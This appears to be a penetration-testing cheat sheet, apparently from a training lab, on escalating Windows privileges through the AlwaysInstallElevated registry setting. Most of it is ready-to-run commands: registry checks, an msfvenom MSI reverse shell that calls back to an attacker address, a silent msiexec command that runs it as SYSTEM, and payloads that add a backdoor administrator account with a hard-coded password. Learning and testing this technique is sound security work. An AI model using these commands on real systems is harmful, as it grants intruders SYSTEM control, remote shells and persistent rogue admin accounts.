MSI files are package files used to install applications.  
These files run with the permissions of the user trying to install  
them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

1.Use winPEAS to see if both registry values are set:  
`.\winPEASany.exe quiet windowscreds`

> [+] Checking AlwaysInstallElevated(T1012)  
> [?] [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated)

```
AlwaysInstallElevated set to 1 in HKLM!
AlwaysInstallElevated set to 1 in HKCU!
```

2.Alternatively, verify the values manually:  
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

3.Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:  
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi`

4.Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:  
`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```